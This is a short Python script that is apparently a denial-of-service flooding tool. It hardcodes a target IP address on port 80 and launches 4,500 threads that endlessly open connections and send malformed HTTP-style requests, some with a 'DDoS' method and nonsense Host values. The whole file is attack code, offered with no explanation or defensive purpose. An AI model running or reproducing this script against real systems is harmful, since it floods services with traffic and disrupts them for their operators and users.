import threading
import socket

target = '104.26.14.138'
port = 80
fake_ip = 'AWKAOKWOAWKOAKWOKOA'
messages = 'WAHYUBAPAKAu'
messagesa = 'AWKAOKWOAWKOAKWOKOA'
already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


def message():
    while True:
        z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        z.connect((target, port))
        z.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        z.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        z.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=message)
    thread.start()

def messagea():
    while True:
        y = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        y.connect((target, port))
        y.sendto(("DDoS /" + messagesa + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        y.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        y.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=messagea)
    thread.start()


def messae():
    while True:
        u = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        u.connect((target, port))
        u.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        u.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        u.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=messae)
    thread.start()


def mesae():
    while True:
        q = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        q.connect((target, port))
        q.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        q.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        q.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=mesae)
    thread.start()


def messa():
    while True:
        w = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        w.connect((target, port))
        w.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        w.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        w.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=messa)
    thread.start()


def messsa():
    while True:
        h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        h.connect((target, port))
        h.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        h.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        h.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=messsa)
    thread.start()


def messssa():
    while True:
        k = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        k.connect((target, port))
        k.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        k.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        k.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=messssa)
    thread.start()


def meop():
    while True:
        gf = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        gf.connect((target, port))
        gf.sendto(("DDoS /" + messages + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        gf.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        gf.close()

        global already_connected
        already_connected += 1
        if already_connected % 500== 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=meop)
    thread.start()